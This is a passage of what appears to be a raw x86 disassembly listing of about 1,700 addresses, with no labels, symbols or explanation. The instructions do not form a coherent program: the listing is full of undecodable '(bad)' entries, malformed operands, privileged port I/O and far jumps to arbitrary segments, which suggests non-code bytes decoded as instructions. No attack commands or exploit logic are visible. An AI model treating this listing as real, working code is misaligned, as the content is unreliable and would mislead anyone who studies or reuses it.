  424cff:	adc    al,0x88
  424d01:	dec    esi
  424d02:	mov    eax,ds:0xa219f825
  424d07:	lds    ebp,FWORD PTR [edx+0x2b12a7d9]
  424d0d:	call   0x5071:0x1a75213b
  424d14:	push   ss
  424d15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424d16:	mov    DWORD PTR [edx-0xb],edx
  424d19:	(bad)  
  424d1a:	xor    bl,BYTE PTR ds:0x9eaa87ca
  424d20:	pop    eax
  424d21:	push   ss
  424d22:	push   ecx
  424d23:	clc    
  424d24:	mov    edx,0x514fe689
  424d29:	cmc    
  424d2a:	inc    esi
  424d2b:	out    dx,al
  424d2c:	push   ss
  424d2d:	cwde   
  424d2e:	mov    ebp,0xfb4ed1ee
  424d33:	jg     0x424ce0
  424d35:	or     eax,0x87f5a07d
  424d3a:	sbb    BYTE PTR [esi+edx*8-0x69],bh
  424d3e:	jne    0x424cc5
  424d40:	xor    BYTE PTR [ecx+0x11d6ed69],0xfd
  424d47:	ins    DWORD PTR es:[edi],dx
  424d48:	(bad)  
  424d49:	and    al,BYTE PTR [edx-0x7]
  424d4c:	push   edi
  424d4d:	es into 
  424d4f:	loope  0x424d69
  424d51:	xor    al,0xb5
  424d53:	cmp    al,0x3c
  424d55:	adc    DWORD PTR [edi+0x5e1524bd],edi
  424d5b:	fnstcw WORD PTR [esi+0x39]
  424d5e:	fsub   QWORD PTR [ebp+0x6c]
  424d61:	in     eax,dx
  424d62:	jo     0x424d37
  424d64:	mov    cl,0xd0
  424d66:	test   eax,0xa7775641
  424d6b:	mov    dl,0xe1
  424d6d:	mov    bh,0xf
  424d6f:	fdivr  DWORD PTR [ebx+0x2]
  424d72:	and    eax,0xcf2e4495
  424d77:	in     eax,dx
  424d78:	movlps xmm1,QWORD PTR [ebx]
  424d7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424d7c:	or     al,0xa1
  424d7e:	sub    DWORD PTR [ebx],edx
  424d80:	int3   
  424d81:	stc    
  424d82:	mov    DWORD PTR [esp+esi*1-0x47c2f3f3],esp
  424d89:	outs   dx,BYTE PTR ds:[esi]
  424d8a:	jge    0x424dae
  424d8c:	stos   BYTE PTR es:[edi],al
  424d8d:	psubd  mm5,mm0
  424d90:	dec    eax
  424d91:	fstp   QWORD PTR [edx+ecx*1+0x5a64393f]
  424d98:	inc    eax
  424d99:	xchg   ebx,eax
  424d9a:	data16 fninit 
  424d9d:	mov    ebx,0x5750bc9a
  424da2:	(bad)
  424da7:	adc    BYTE PTR [ebx+ebx*4+0x3d1c4248],ah
  424dae:	and    eax,0xc8251d03
  424db3:	mov    ?,WORD PTR [ebx+0x455000bf]
  424db9:	sub    eax,0xa406b289
  424dbe:	pop    edi
  424dbf:	inc    edx
  424dc0:	je     0x424d73
  424dc2:	aaa    
  424dc3:	or     al,0xd9
  424dc5:	xchg   ebx,eax
  424dc6:	jno    0x424db8
  424dc8:	dec    edi
  424dc9:	dec    BYTE PTR [ecx+ebp*1]
  424dcc:	pop    esp
  424dcd:	adc    al,0x69
  424dcf:	pusha  
  424dd0:	push   ebp
  424dd1:	sub    cl,BYTE PTR [ecx+eax*1-0x68b8b1af]
  424dd8:	dec    edi
  424dd9:	mov    ah,0x19
  424ddb:	les    esp,FWORD PTR ds:0x17129bcb
  424de1:	adc    DWORD PTR [esp+ebx*8+0x4e5ddbdb],edx
  424de8:	aam    0xd3
  424dea:	pop    es
  424deb:	aam    0x34
  424ded:	jmp    0x424ddd
  424def:	cwde   
  424df0:	ins    DWORD PTR es:[edi],dx
  424df1:	dec    BYTE PTR [ecx-0x2d]
  424df4:	out    0xaa,al
  424df6:	out    0xee,eax
  424df8:	xchg   ebp,eax
  424df9:	aad    0xf
  424dfb:	xchg   esi,eax
  424dfc:	mov    WORD PTR [eax*1-0x137de110],cs
  424e03:	xchg   ecx,eax
  424e04:	fisttp DWORD PTR [edi+0x1c]
  424e07:	mov    dh,0x24
  424e09:	pop    esp
  424e0a:	(bad)  
  424e0b:	mov    ch,0x9b
  424e0d:	gs daa 
  424e0f:	(bad)  
  424e10:	adc    BYTE PTR ds:0xce9879ca,dh
  424e16:	jl     0x424e3a
  424e18:	mov    bh,0x7f
  424e1a:	shr    BYTE PTR [ebp+0x60e2b2e4],cl
  424e20:	in     eax,dx
  424e21:	sbb    eax,0x6eb03550
  424e26:	sub    eax,0xade5003b
  424e2b:	fld    DWORD PTR [ebp+esi*2+0x0]
  424e2f:	inc    edx
  424e30:	dec    edi
  424e31:	nop
  424e32:	int3   
  424e33:	popf   
  424e34:	fistp  WORD PTR [esi-0x31]
  424e37:	aad    0xa
  424e39:	pop    esi
  424e3a:	jns    0x424e75
  424e3c:	inc    esp
  424e3d:	sbb    eax,0x1c7532c
  424e42:	add    bh,ah
  424e44:	add    DWORD PTR [eax],eax
  424e46:	add    BYTE PTR [edx+0x39b28270],bl
  424e4c:	cdq    
  424e4d:	jp     0x424df9
  424e4f:	stos   DWORD PTR es:[edi],eax
  424e50:	adc    eax,0x285678bb
  424e55:	jns    0x424eaf
  424e57:	push   eax
  424e58:	jnp    0x424e91
  424e5a:	scas   eax,DWORD PTR es:[edi]
  424e5b:	ja     0x424ed4
  424e5d:	push   0xfffffffe
  424e5f:	and    eax,0x3acab9dc
  424e64:	mov    ebx,eax
  424e66:	mov    eax,ds:0x977f3932
  424e6b:	xchg   ebx,eax
  424e6c:	adc    ch,BYTE PTR [ebx]
  424e6e:	sbb    al,0xa7
  424e70:	es push eax
  424e72:	pushf  
  424e73:	rol    BYTE PTR [ecx-0x6fa146d5],0xb0
  424e7a:	inc    esi
  424e7b:	jne    0x424eac
  424e7d:	pushf  
  424e7e:	frstor [eax+edx*1-0x37]
  424e82:	cmc    
  424e83:	xor    bl,BYTE PTR [edi-0x5955f572]
  424e89:	out    0xda,eax
  424e8b:	iret   
  424e8c:	cwde   
  424e8d:	int3   
  424e8e:	data16 aad 0xef
  424e91:	mov    ebp,ds
  424e93:	mov    al,0x14
  424e95:	cli    
  424e96:	pusha  
  424e97:	dec    eax
  424e98:	sub    dh,BYTE PTR [eax]
  424e9a:	jo     0x424e8b
  424e9c:	call   0x606d:0x2f883747
  424ea3:	sub    al,0xb5
  424ea5:	fmul   st(4),st
  424ea7:	sahf   
  424ea8:	test   eax,0xd7446092
  424ead:	test   al,0xfc
  424eaf:	mov    ecx,0x5974c5d2
  424eb4:	adc    DWORD PTR [ebx+edx*8],0xdf39ad26
  424ebb:	out    dx,al
  424ebc:	sub    eax,0x56858e8
  424ec1:	je     0x424e43
  424ec3:	mov    ch,0x3b
  424ec5:	mov    esi,gs
  424ec7:	and    eax,0xa5f7421c
  424ecc:	test   esp,esi
  424ece:	imul   eax,DWORD PTR [esi],0x62
  424ed1:	xbegin 0x1c8b8faa
  424ed7:	xlat   BYTE PTR ds:[ebx]
  424ed8:	xchg   DWORD PTR [ebx],esp
  424eda:	scas   al,BYTE PTR es:[edi]
  424edb:	pop    edx
  424edc:	mov    esp,0x19025118
  424ee1:	sbb    eax,0xf22b17ce
  424ee6:	jo     0x424f5a
  424ee8:	(bad)  
  424ee9:	ja     0x424ea2
  424eeb:	mov    BYTE PTR [ecx-0x11],cl
  424eee:	cmp    al,0x3
  424ef0:	fwait
  424ef1:	loopne 0x424f02
  424ef3:	mov    ds:0x76fb864,al
  424ef8:	mov    edi,0x250cf408
  424efd:	stc    
  424efe:	sbb    ch,dl
  424f00:	push   esi
  424f01:	leave  
  424f02:	dec    ecx
  424f03:	loopne 0x424ed4
  424f05:	mov    ds:0xad9d51e3,al
  424f0a:	aam    0x18
  424f0c:	mov    edi,0x1afca332
  424f11:	xchg   edx,eax
  424f12:	ret    0x6ded
  424f15:	int3   
  424f16:	cmp    eax,ebx
  424f18:	mov    eax,0xeb1883e2
  424f1d:	outs   dx,BYTE PTR ds:[esi]
  424f1e:	sbb    DWORD PTR [edx+0x49ba74fe],0x5b
  424f25:	mov    ebx,0x7a4e78a0
  424f2a:	ret    0x14c9
  424f2d:	ret    
  424f2e:	sbb    ebx,edx
  424f30:	jns    0x424ed0
  424f32:	fsub   DWORD PTR [eax]
  424f34:	xchg   edx,eax
  424f35:	(bad)  
  424f36:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424f37:	pop    esi
  424f38:	popa   
  424f39:	xchg   ebp,eax
  424f3a:	sahf   
  424f3b:	adc    DWORD PTR es:[edi-0x4f],0xba34efad
  424f43:	fisub  DWORD PTR es:[edi-0x5]
  424f47:	hlt    
  424f48:	sbb    BYTE PTR [eax+0x1c],bl
  424f4b:	es fsubr DWORD PTR cs:[edx+0xd4478f6]
  424f53:	into   
  424f54:	stc    
  424f55:	pusha  
  424f56:	iret   
  424f57:	mov    edi,DWORD PTR [ebx-0x5f]
  424f5a:	push   esp
  424f5b:	push   edi
  424f5c:	pop    esi
  424f5d:	frstor [ecx]
  424f5f:	ret    
  424f60:	jo     0x424fa6
  424f62:	sub    eax,0x4780868a
  424f67:	ja     0x424f34
  424f69:	mov    al,ds:0xb4093253
  424f6e:	shl    DWORD PTR [ecx+eiz*4],0x58
  424f72:	out    0xee,al
  424f74:	adc    ebp,DWORD PTR [eax+0x53]
  424f77:	ficom  WORD PTR ds:0x8c945b58
  424f7d:	mov    ebx,0xc42f4801
  424f82:	dec    ebp
  424f83:	xor    eax,0xfcc97b31
  424f88:	shr    BYTE PTR [ecx+0x154f07d5],1
  424f8e:	fdiv   st,st(6)
  424f90:	je     0x424fcc
  424f92:	gs int3 
  424f94:	repnz into 
  424f96:	inc    esi
  424f97:	stos   DWORD PTR es:[edi],eax
  424f98:	pop    esp
  424f99:	sti    
  424f9a:	jb     0x424f2c
  424f9c:	xchg   ecx,eax
  424f9d:	mov    al,ds:0xf0e8bf4d
  424fa2:	sbb    BYTE PTR ds:0x67f03aba,al
  424fa8:	outs   dx,BYTE PTR ds:[esi]
  424fa9:	je     0x424f7a
  424fab:	je     0x424fea
  424fad:	mov    dh,0x33
  424faf:	in     eax,0x78
  424fb1:	nop
  424fb2:	(bad)  
  424fb3:	and    BYTE PTR [ecx],dl
  424fb5:	mov    ebp,0xa44d81c9
  424fba:	push   ds
  424fbb:	ss jns 0x424fc6
  424fbe:	cmc    
  424fbf:	imul   edi,DWORD PTR [edi+0x15380853],0x362b7227
  424fc9:	cs test eax,0x7da48810
  424fcf:	or     cl,BYTE PTR [edx]
  424fd1:	test   al,0x8e
  424fd3:	int    0x3c
  424fd5:	lock mov bl,0x59
  424fd8:	pop    ebx
  424fd9:	mov    esi,0x2f4fae3b
  424fde:	cmp    al,bl
  424fe0:	(bad)
  424fe3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424fe4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424fe5:	pop    edx
  424fe6:	loope  0x425022
  424fe8:	and    al,0x74
  424fea:	xchg   esp,ecx
  424fec:	loop   0x425023
  424fee:	push   eax
  424fef:	push   eax
  424ff0:	lahf   
  424ff1:	jnp    0x425058
  424ff3:	es add cl,bl
  424ff6:	pop    ebx
  424ff7:	jg     0x42506f
  424ff9:	cli    
  424ffa:	push   cs
  424ffb:	and    al,0x33
  424ffd:	pop    esi
  424ffe:	xor    bh,BYTE PTR [ebx]
  425000:	cmp    dl,BYTE PTR [edx]
  425002:	xlat   BYTE PTR ds:[ebx]
  425003:	arpl   WORD PTR [edx+0x3e],bx
  425006:	adc    eax,0xef90ecd4
  42500b:	stos   DWORD PTR es:[edi],eax
  42500c:	call   0x943aae7e
  425011:	js     0x424fcc
  425013:	shufps xmm0,xmm0,0x60
  425017:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425018:	(bad)  
  425019:	out    dx,eax
  42501a:	in     eax,0x4d
  42501c:	push   cs
  42501d:	fsubr  DWORD PTR ds:0xb76e1656
  425023:	add    al,0xec
  425025:	jae    0x425092
  425027:	call   0x6946:0xc6f3ffab
  42502e:	add    BYTE PTR [esi+0x7c],ah
  425031:	loopne 0x424fee
  425033:	cli    
  425034:	mov    edi,0xc56cfd7f
  425039:	ret    
  42503a:	ds ret 
  42503c:	add    ch,ah
  42503e:	adc    edi,DWORD PTR [edx]
  425040:	leave  
  425041:	add    DWORD PTR [eax],eax
  425043:	out    0x1,eax
  425045:	add    BYTE PTR [eax],al
  425047:	cmp    edx,eax
  425049:	mov    BYTE PTR [edi+eiz*8+0x3d],ch
  42504d:	sti    
  42504e:	inc    ebp
  42504f:	jne    0x425083
  425051:	push   ebp
  425052:	sbb    al,0x9f
  425054:	mov    dl,0x11
  425056:	pop    es
  425057:	or     al,0x26
  425059:	(bad)  
  42505a:	out    0x59,al
  42505c:	adc    BYTE PTR [edx],0xa8
  42505f:	ror    edx,1
  425061:	loop   0x42508a
  425063:	fimul  DWORD PTR [edi]
  425065:	(bad)  [eax+0x51]
  425068:	repz adc al,0x93
  42506b:	push   cs
  42506c:	loop   0x425063
  42506e:	rol    DWORD PTR [ecx+0x3f9f73d8],0x2e
  425075:	add    ebp,ebp
  425077:	sbb    eax,0x1a1430ef
  42507c:	push   edx
  42507d:	rcl    DWORD PTR [edx+esi*4],0x9e
  425081:	xlat   BYTE PTR ds:[ebx]
  425082:	lock pop ds
  425084:	cmc    
  425085:	xchg   ebx,eax
  425086:	jbe    0x4250c7
  425088:	loope  0x42508d
  42508a:	xor    cl,dh
  42508c:	fild   WORD PTR [edi+0x67483cd9]
  425092:	mov    ecx,0x5acb1e30
  425097:	std    
  425098:	push   edi
  425099:	ficomp DWORD PTR [ecx+edx*4]
  42509c:	test   DWORD PTR [edx+eiz*1+0xbad0186],esi
  4250a3:	mov    ds:0x22b73c98,eax
  4250a8:	xchg   DWORD PTR [edx],ebp
  4250aa:	cmp    BYTE PTR [ebx+0x5c],al
  4250ad:	push   edx
  4250ae:	sti    
  4250af:	js     0x42507c
  4250b1:	and    bh,BYTE PTR [eax+ebx*8-0x23]
  4250b5:	xor    al,0x11
  4250b7:	inc    ebx
  4250b8:	fld    TBYTE PTR [eax]
  4250ba:	sub    bl,BYTE PTR [eax]
  4250bc:	dec    sp
  4250be:	das    
  4250bf:	xchg   ebx,eax
  4250c0:	jl     0x42507b
  4250c2:	mov    cl,0xa3
  4250c4:	sbb    BYTE PTR [ebp-0x44b5b6bd],ah
  4250ca:	rcl    BYTE PTR ds:0xf872e226,cl
  4250d0:	or     DWORD PTR cs:[eax],ebx
  4250d3:	lahf   
  4250d4:	push   ecx
  4250d5:	mov    DWORD PTR [ecx+0x6e],eax
  4250d8:	(bad)  
  4250da:	rcr    DWORD PTR [ebx],cl
  4250dc:	ficomp WORD PTR [esi+esi*1]
  4250df:	or     dl,BYTE PTR [edx]
  4250e1:	ret    0x7b47
  4250e4:	addr16 push esi
  4250e6:	cwde   
  4250e7:	pop    eax
  4250e8:	and    eax,0xb02d3532
  4250ed:	inc    eax
  4250ee:	mov    al,ds:0xf8ffe4de
  4250f3:	arpl   WORD PTR [edi+0x323cbaab],bp
  4250f9:	jmp    0xa43e:0xf4da3ff6
  425100:	mov    cl,0x8f
  425102:	xor    bh,bl
  425104:	or     eax,0xb1956d5b
  425109:	loop   0x42510e
  42510b:	push   ds
  42510c:	inc    ebx
  42510d:	dec    ebx
  42510e:	sub    esi,DWORD PTR [edx+0x31]
  425111:	(bad)  
  425112:	ret    0x5c08
  425115:	add    ch,al
  425117:	jns    0x4250a5
  425119:	or     eax,0xf83a24ed
  42511e:	jp     0x425181
  425120:	push   edx
  425121:	xor    eax,DWORD PTR [eax-0x1c]
  425124:	dec    eax
  425125:	dec    eax
  425126:	stc    
  425127:	sub    cl,BYTE PTR [ebx+0x49]
  42512a:	and    eax,0xdf67717b
  42512f:	stos   DWORD PTR es:[edi],eax
  425130:	sbb    al,bl
  425132:	add    al,0x51
  425134:	dec    esp
  425135:	sub    eax,0x283ed009
  42513a:	loope  0x4250c4
  42513c:	sbb    al,0x23
  42513e:	inc    ebp
  42513f:	leave  
  425140:	mov    al,ds:0xabb0f0c8
  425145:	cmp    DWORD PTR [ecx-0x1a],ebx
  425148:	pushf  
  425149:	mov    edi,0x8c6a1f99
  42514e:	in     al,dx
  42514f:	mov    ds:0xd8486ae4,al
  425154:	bound  ecx,QWORD PTR [esi+eiz*1+0x7cb1b7b4]
  42515b:	loop   0x425187
  42515d:	(bad)
  425160:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425161:	and    bl,BYTE PTR [ebx-0x49bf55a9]
  425167:	repnz inc ebp
  425169:	and    DWORD PTR [ecx],0xfffffff4
  42516c:	push   edi
  42516d:	pushf  
  42516e:	test   DWORD PTR ds:0xa01db9f3,0x39578c2b
  425178:	scas   al,BYTE PTR es:[edi]
  425179:	das    
  42517a:	(bad)  
  42517b:	(bad)  
  42517c:	mov    eax,ds:0x9dced79e
  425181:	out    dx,eax
  425182:	inc    edx
  425183:	pop    ebp
  425184:	imul   BYTE PTR ds:0xc6a66034
  42518a:	push   ecx
  42518b:	outs   dx,BYTE PTR ds:[esi]
  42518c:	data16 mov al,ds:0xca039ac5
  425192:	ins    DWORD PTR es:[edi],dx
  425193:	mov    esi,0x62d209bd
  425198:	std    
  425199:	dec    ebp
  42519a:	pushf  
  42519b:	jnp    0x425203
  42519d:	pop    ds
  42519e:	xor    BYTE PTR [edx+0x1ed28ff7],dh
  4251a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4251a5:	mov    WORD PTR [ebx+ebp*1+0x60],fs
  4251a9:	ror    DWORD PTR [esi],cl
  4251ab:	adc    esp,DWORD PTR [esi]
  4251ad:	lock daa 
  4251af:	popa   
  4251b0:	ins    DWORD PTR es:[edi],dx
  4251b1:	ret    0x5d74
  4251b4:	test   eax,0x3ce2fb5d
  4251b9:	pop    edi
  4251ba:	xchg   esp,eax
  4251bb:	out    dx,eax
  4251bc:	std    
  4251bd:	test   eax,0x22c55414
  4251c2:	fadd   DWORD PTR [edi+0x70c84166]
  4251c8:	xor    bl,al
  4251ca:	test   DWORD PTR [eax+ebp*4-0x13],esi
  4251ce:	cmp    DWORD PTR [ebx-0x28],ecx
  4251d1:	stos   DWORD PTR es:[edi],eax
  4251d2:	ss loopne 0x4251b8
  4251d5:	cmp    dl,BYTE PTR [ecx-0x4be7077f]
  4251db:	sbb    eax,0xdfb3834b
  4251e0:	aaa    
  4251e1:	bound  edx,QWORD PTR [edi+0x55b831d2]
  4251e7:	and    BYTE PTR [esi-0x45],dh
  4251ea:	mov    ebx,DWORD PTR [ebx-0xcec01d9]
  4251f0:	add    BYTE PTR [eax+0x5360563d],cl
  4251f6:	sbb    dl,BYTE PTR [ebx]
  4251f8:	inc    ebx
  4251f9:	mov    ds:0xe2f989c7,al
  4251fe:	dec    edi
  4251ff:	aaa    
  425200:	sub    al,0x29
  425202:	sbb    DWORD PTR [edx],ebx
  425204:	mov    al,0xb3
  425206:	pop    esi
  425207:	push   eax
  425208:	xchg   ebp,eax
  425209:	lahf   
  42520a:	inc    edx
  42520b:	in     al,0x3a
  42520d:	lea    ecx,[edx+ebx*1]
  425210:	mov    BYTE PTR [edi],dh
  425212:	enter  0xadbb,0xbd
  425216:	scas   eax,DWORD PTR es:[edi]
  425217:	add    ecx,DWORD PTR [edi+0x34]
  42521a:	popa   
  42521b:	inc    ecx
  42521c:	xlat   BYTE PTR ds:[ebx]
  42521d:	stc    
  42521e:	aad    0x81
  425220:	or     DWORD PTR [edi],edi
  425222:	xor    DWORD PTR [ebx+0x14754371],esi
  425228:	mov    edi,0x2e767097
  42522d:	lahf   
  42522e:	add    BYTE PTR [edi+0x75],ah
  425231:	int3   
  425232:	inc    eax
  425233:	fdivp  st(1),st
  425235:	out    dx,eax
  425236:	ja     0x425288
  425238:	xor    ebx,DWORD PTR [eax+0x52]
  42523b:	stos   BYTE PTR es:[edi],al
  42523c:	out    dx,eax
  42523d:	cmp    ch,bh
  42523f:	and    ebx,ecx
  425241:	add    DWORD PTR [eax],eax
  425243:	out    0x1,eax
  425245:	add    BYTE PTR [eax],al
  425247:	iret   
  425248:	ins    DWORD PTR es:[edi],dx
  425249:	imul   ebx,DWORD PTR [edx-0x64],0xbdf3ca27
  425250:	stos   BYTE PTR es:[edi],al
  425251:	dec    edi
  425252:	add    al,BYTE PTR [eax+0x10]
  425255:	rcl    BYTE PTR [ebp-0x3f],cl
  425258:	push   esp
  425259:	dec    esi
  42525a:	xchg   esp,eax
  42525b:	inc    esi
  42525c:	lods   al,BYTE PTR ds:[esi]
  42525d:	sahf   
  42525e:	fcomp  DWORD PTR [ebp+0x2]
  425261:	push   0xffffffb8
  425263:	jge    0x425210
  425265:	rcl    DWORD PTR [ecx+0x47],0xb7
  425269:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42526a:	adc    al,BYTE PTR [ebx+0x6a467cd1]
  425270:	and    bh,0x23
  425273:	(bad)  
  425274:	jbe    0x4252c5
  425276:	ja     0x4252df
  425278:	or     eax,0x82492f57
  42527d:	or     DWORD PTR [ebp+0x51f00ede],esi
  425283:	jmp    0xe8f7:0x5b6a48da
  42528a:	loop   0x425213
  42528c:	xor    DWORD PTR [ebp+0x7126102],edx
  425292:	xchg   esi,eax
  425293:	mov    cl,0xe9
  425295:	inc    esp
  425296:	jbe    0x4252f6
  425298:	xchg   ecx,eax
  425299:	pop    ecx
  42529a:	scas   eax,DWORD PTR es:[edi]
  42529b:	add    al,0x1e
  42529d:	jmp    0x425286
  42529f:	pop    ds
  4252a0:	lea    ebp,[edi-0x50146e5d]
  4252a6:	mov    ah,0x5f
  4252a8:	sbb    bh,ah
  4252aa:	(bad)  
  4252ab:	(bad)  
  4252ac:	das    
  4252ad:	int    0xda
  4252af:	pop    edx
  4252b0:	xor    eax,DWORD PTR [esi-0x44e87eb]
  4252b6:	sub    al,0x39
  4252b8:	pop    ecx
  4252b9:	xchg   edx,eax
  4252ba:	in     al,dx
  4252bb:	xchg   edi,eax
  4252bc:	and    DWORD PTR [edi],ebx
  4252be:	in     eax,0x1d
  4252c0:	push   es
  4252c1:	jnp    0x4252cc
  4252c3:	(bad)  
  4252c4:	jae    0x4252ee
  4252c6:	imul   edi,DWORD PTR [ebx-0x75f50217],0xffffff84
  4252cd:	jmp    0x4252d1
  4252cf:	shr    DWORD PTR [edi+edi*8+0x67],0x8
  4252d4:	rcl    BYTE PTR [edi],1
  4252d6:	aas    
  4252d7:	retf   0x280e
  4252da:	or     dl,al
  4252dc:	xor    eax,0x7f8fa188
  4252e1:	add    dh,BYTE PTR [eax+edi*8+0x45199d53]
  4252e8:	leave  
  4252e9:	dec    esi
  4252ea:	aas    
  4252eb:	pop    eax
  4252ec:	pop    ecx
  4252ed:	shr    ah,cl
  4252ef:	lock loop 0x4252fa
  4252f2:	inc    ebp
  4252f3:	sbb    BYTE PTR [esi-0x4056ab41],cl
  4252f9:	std    
  4252fa:	leave  
  4252fb:	xchg   esp,eax
  4252fc:	sbb    al,0xa0
  4252fe:	or     al,0x8f
  425300:	and    DWORD PTR [eax+0x53908b46],esi
  425306:	pop    ss
  425307:	int3   
  425308:	ds mov ebp,0xdb3e80e6
  42530e:	or     al,0x5e
  425310:	sbb    eax,0x58c9f515
  425315:	pop    esi
  425316:	jb     0x4252c8
  425318:	jns    0x425306
  42531a:	xchg   ebx,eax
  42531b:	cmc    
  42531c:	dec    ebx
  42531d:	btr    DWORD PTR [edi],edi
  425320:	(bad)  
  425321:	xchg   esi,eax
  425322:	mov    edx,0x3e577637
  425327:	into   
  425328:	mov    ebp,0x16ba4a46
  42532d:	mov    ebp,0x4f77449d
  425332:	sub    bh,BYTE PTR [ecx+0x59fc5e10]
  425338:	rcr    DWORD PTR [edx],0xfd
  42533b:	bound  ebx,QWORD PTR [ebx+esi*4+0x23ee9ad4]
  425342:	inc    ebx
  425343:	or     al,0x30
  425345:	dec    esi
  425346:	rcr    DWORD PTR [ebp+edi*4+0x51a19370],1
  42534d:	sbb    DWORD PTR [ebp-0x1a0df4d3],esp
  425353:	test   BYTE PTR [ecx+ebx*1],bh
  425356:	bound  eax,QWORD PTR [eax+0x7d]
  425359:	scas   al,BYTE PTR es:[edi]
  42535a:	scas   al,BYTE PTR es:[edi]
  42535b:	sbb    al,0xb
  42535d:	cmc    
  42535e:	lods   al,BYTE PTR ds:[esi]
  42535f:	stos   BYTE PTR es:[edi],al
  425360:	inc    edi
  425361:	dec    eax
  425362:	out    dx,al
  425363:	ret    0xf6fb
  425366:	fdiv   QWORD PTR [esi-0x1fab95ce]
  42536c:	iret   
  42536d:	push   edx
  42536e:	mov    bh,BYTE PTR [eax+0x29ff6559]
  425374:	jns    0x42538b
  425376:	mov    WORD PTR [edi+0x73],?
  425379:	cld    
  42537a:	xor    al,0x55
  42537c:	hlt    
  42537d:	in     eax,0xaf
  42537f:	xor    ah,BYTE PTR [ecx+ebx*2+0x54]
  425383:	xchg   ebp,eax
  425384:	gs cmp bl,cl
  425387:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425388:	aam    0xde
  42538a:	sahf   
  42538b:	dec    ecx
  42538c:	sti    
  42538d:	mov    edi,0xf8ba89f8
  425392:	xchg   BYTE PTR [esi+0x7],bh
  425395:	xchg   ecx,eax
  425396:	dec    ebp
  425397:	(bad)  
  425398:	mov    al,0xb2
  42539a:	sahf   
  42539b:	(bad)  
  42539c:	mov    edx,0x472817
  4253a1:	xor    eax,0xb238b89f
  4253a6:	jge    0x425405
  4253a8:	mov    esi,fs
  4253aa:	xchg   esp,eax
  4253ab:	imul   edx,DWORD PTR [esi],0x311838b1
  4253b1:	jae    0x425425
  4253b3:	inc    esp
  4253b4:	add    DWORD PTR [ebx+0x11],ebp
  4253b7:	leave  
  4253b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4253b9:	imul   ebx,DWORD PTR ds:0x2247963c,0x73
  4253c0:	add    BYTE PTR [esi+0x5006e959],ch
  4253c6:	add    al,0xcc
  4253c8:	xchg   edi,eax
  4253c9:	add    DWORD PTR [esi],edx
  4253cb:	jne    0x4253e0
  4253cd:	sahf   
  4253ce:	std    
  4253cf:	add    edi,DWORD PTR [edi]
  4253d1:	jl     0x4253b3
  4253d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4253d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4253d5:	outs   dx,BYTE PTR ds:[esi]
  4253d6:	aam    0xca
  4253d8:	cwde   
  4253d9:	ja     0x4253bb
  4253db:	jo     0x4253bb
  4253dd:	mov    ebp,0xb318ccba
  4253e2:	sub    eax,0x5ccf7753
  4253e7:	push   edx
  4253e8:	adc    DWORD PTR [eax+0x4b],edx
  4253eb:	cmp    al,0x30
  4253ed:	icebp  
  4253ee:	xchg   ebx,eax
  4253ef:	scas   eax,DWORD PTR es:[edi]
  4253f0:	sub    DWORD PTR [ebp-0x1],esi
  4253f3:	dec    esi
  4253f4:	inc    eax
  4253f5:	or     bl,dl
  4253f7:	pop    es
  4253f8:	cmp    bh,cl
  4253fa:	mov    ds:0x84bc9e5b,eax
  4253ff:	fmul   DWORD PTR [ecx]
  425401:	sub    ebx,DWORD PTR [edi+0x7f]
  425404:	cmc    
  425405:	mov    ds:0xfd019529,eax
  42540a:	jbe    0x42547b
  42540c:	js     0x4253a7
  42540e:	(bad)  
  42540f:	and    ebp,DWORD PTR [edi-0x1a]
  425412:	adc    DWORD PTR [edx],eax
  425414:	clc    
  425415:	push   ecx
  425416:	das    
  425417:	pop    eax
  425418:	not    DWORD PTR [edx-0x3e]
  42541b:	ret    0xa3fe
  42541e:	sub    al,0xbc
  425420:	fmul   DWORD PTR [eax-0x6a765ea8]
  425426:	cli    
  425427:	xchg   esp,eax
  425428:	xchg   BYTE PTR [esi],bl
  42542a:	sbb    BYTE PTR [eax-0x5fffd76c],ah
  425430:	sub    al,0xb4
  425432:	or     DWORD PTR [ecx+ebx*4+0x586aadbd],edi
  425439:	je     0x425454
  42543b:	xor    al,0x4f
  42543d:	push   ds
  42543e:	dec    BYTE PTR [eax]
  425440:	int    0x1
  425442:	add    bh,ah
  425444:	add    DWORD PTR [eax],eax
  425446:	add    BYTE PTR [edx-0x28752920],cl
  42544c:	mov    cl,0x4c
  42544e:	push   eax
  42544f:	dec    edx
  425450:	lds    eax,FWORD PTR [ecx]
  425452:	sbb    al,0x80
  425454:	inc    ecx
  425455:	ins    WORD PTR es:[edi],dx
  425457:	cmp    DWORD PTR [eax+edi*2-0x7c],edx
  42545b:	xchg   edi,eax
  42545c:	out    dx,eax
  42545d:	stos   BYTE PTR es:[edi],al
  42545e:	frstor [ebp+0x79284cec]
  425464:	nop
  425465:	div    BYTE PTR [ecx+ecx*2-0x7341ecdd]
  42546c:	push   0x9010ef37
  425471:	bnd jg 0x4254c6
  425474:	xlat   BYTE PTR ds:[ebx]
  425475:	jbe    0x425467
  425477:	cmp    eax,0x12fde5d3
  42547c:	jno    0x425464
  42547e:	xchg   DWORD PTR [ebx+0x70],edx
  425481:	out    0xa2,al
  425483:	arpl   WORD PTR [esi+ecx*1],bp
  425486:	retf   0xa73e
  425489:	je     0x42542e
  42548b:	add    DWORD PTR [ebx],0x3352c7d2
  425491:	pop    esp
  425492:	jecxz  0x4254ce
  425494:	mov    eax,0x7b48375e
  425499:	fmul   DWORD PTR [ecx]
  42549b:	and    esi,DWORD PTR [ebx-0x114c6036]
  4254a1:	xchg   edx,eax
  4254a2:	mov    dl,0xa0
  4254a4:	clc    
  4254a5:	outs   dx,DWORD PTR ds:[esi]
  4254a6:	je     0x425471
  4254a8:	inc    ecx
  4254a9:	int    0x3
  4254ab:	aaa    
  4254ac:	ret    0xd550
  4254af:	test   ecx,edi
  4254b1:	retf   0x8993
